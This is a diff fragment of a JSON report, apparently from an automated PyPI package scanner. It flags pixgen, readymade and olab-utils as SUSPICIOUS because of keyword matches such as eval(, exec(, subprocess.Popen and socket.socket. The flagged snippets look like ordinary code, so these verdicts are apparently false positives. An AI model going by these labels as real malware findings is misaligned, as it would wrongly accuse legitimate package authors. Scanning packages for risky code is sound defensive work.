+        "file": "aspire_si-1.1.0/tests/perception/test_theory_of_mind_more.py",
+        "line": 281,
+        "keyword_detected": "eval(",
+        "code_snippet": "return MentalStateTracker(hidden_dim=16).eval()"
+      }
+    ]
+  },
+  {
+    "package_name": "pixgen",
+    "checked_at": "2026-10-07T01:03:00.111905",
+    "download_url": "https://files.pythonhosted.org/packages/ab/e2/62f0a36cd76f2cc3741ec66a1de61f0134c2eea36471cba9ce050a5fad17/pixgen-0.1.1.tar.gz",
+    "decision": "SUSPICIOUS",
+    "evidences": [
+      {
+        "file": "pixgen-0.1.1/src/pixgen/providers/http.py",
+        "line": 51,
+        "keyword_detected": "base64.b64decode",
+        "code_snippet": "image_bytes = base64.b64decode(encoded, validate=True)"
+      }
+    ]
+  },
+  {
+    "package_name": "readymade",
+    "checked_at": "2026-10-07T01:03:00.665172",
+    "download_url": "https://files.pythonhosted.org/packages/99/4f/bccac29cdb87fc0bfcd500216021736247877951910aaf219d2025990b49/readymade-0.0.1.tar.gz",
+    "decision": "SUSPICIOUS",
+    "evidences": [
+      {
+        "file": "readymade-0.0.1/readymade/ide/app.py",
+        "line": 47,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "self.process: subprocess.Popen | None = None  # the running program, or venv/pip"
+      },
+      {
+        "file": "readymade-0.0.1/readymade/ide/app.py",
+        "line": 763,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "process = subprocess.Popen("
+      },
+      {
+        "file": "readymade-0.0.1/tests/conftest.py",
+        "line": 21,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "server = subprocess.Popen("
+      },
+      {
+        "file": "readymade-0.0.1/tests/test_package.py",
+        "line": 64,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "running = subprocess.Popen([str(program)], stderr=subprocess.PIPE, text=True)"
+      },
+      {
+        "file": "readymade-0.0.1/tests/test_project.py",
+        "line": 171,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "process = subprocess.Popen("
+      },
+      {
+        "file": "readymade-0.0.1/tools/drive_ide.py",
+        "line": 79,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "server = subprocess.Popen("
+      },
+      {
+        "file": "readymade-0.0.1/tools/drive_ide.py",
+        "line": 179,
+        "keyword_detected": "eval(",
+        "code_snippet": "return eval(line[len(marker) + 1 :])"
+      },
+      {
+        "file": "readymade-0.0.1/tools/drive_ide.py",
+        "line": 485,
+        "keyword_detected": "exec(",
+        "code_snippet": "\"exec(\\\"def shown_menus(tk):\\\\n out, todo = [], ['.']\\\\n while todo:\\\\n  p = todo.pop()\\\\n\""
+      },
+      {
+        "file": "readymade-0.0.1/tools/drive_ide.py",
+        "line": 534,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "typist = subprocess.Popen([\"sh\", \"-c\", f\"sleep 2; xdotool type --delay 20 '{pictures / 'badge.png'}'; xdotool key Return\"])"
+      },
+      {
+        "file": "readymade-0.0.1/tools/drive_ide.py",
+        "line": 591,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "typist = subprocess.Popen([\"sh\", \"-c\", f\"sleep 2; xdotool type --delay 20 '{family}'; xdotool key Return\"])"
+      }
+    ]
+  },
+  {
+    "package_name": "olab-utils",
+    "checked_at": "2026-10-07T01:03:01.018872",
+    "download_url": "https://files.pythonhosted.org/packages/4f/52/316161d9e8a3e73b6ef1c883d663ce8b7bd264eb7e218798c224ccacfed7/olab_utils-0.1.0.tar.gz",
+    "decision": "SUSPICIOUS",
+    "evidences": [
+      {
+        "file": "olab_utils-0.1.0/src/olab_utils/__init__.py",
+        "line": 1639,
+        "keyword_detected": "socket.socket",
+        "code_snippet": "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
+      },
+      {
+        "file": "olab_utils-0.1.0/src/olab_utils/__init__.py",
+        "line": 1672,
+        "keyword_detected": "socket.socket",
+        "code_snippet": "s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)"
+      }
+    ]
   }
 ]
